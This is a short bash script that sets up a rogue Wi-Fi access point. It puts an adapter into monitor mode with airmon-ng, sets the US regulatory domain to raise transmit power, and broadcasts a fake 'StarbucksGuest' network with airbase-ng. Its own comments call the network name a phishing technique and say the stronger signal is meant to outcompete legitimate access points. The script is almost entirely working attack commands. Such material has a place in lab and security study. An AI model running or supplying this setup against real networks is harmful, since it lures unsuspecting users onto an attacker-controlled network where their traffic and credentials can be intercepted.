#!/bin/bash
#This script sets up the AP and boosts it to the highest US regulation
#Most APs run at an "efficient" transmission power, so our AP should be a stronger signal
sudo ifconfig wlx9cefd5fc329b up
sudo airmon-ng start wlx9cefd5fc329b
sudo ifconfig wlan0mon down
sudo iw reg set US
sudo ifconfig wlan0mon up
#Using StarbucksGuest is a phishing technique, rather than copying the name of another AP
sudo airbase-ng -e "StarbucksGuest" -c 1 wlan0mon
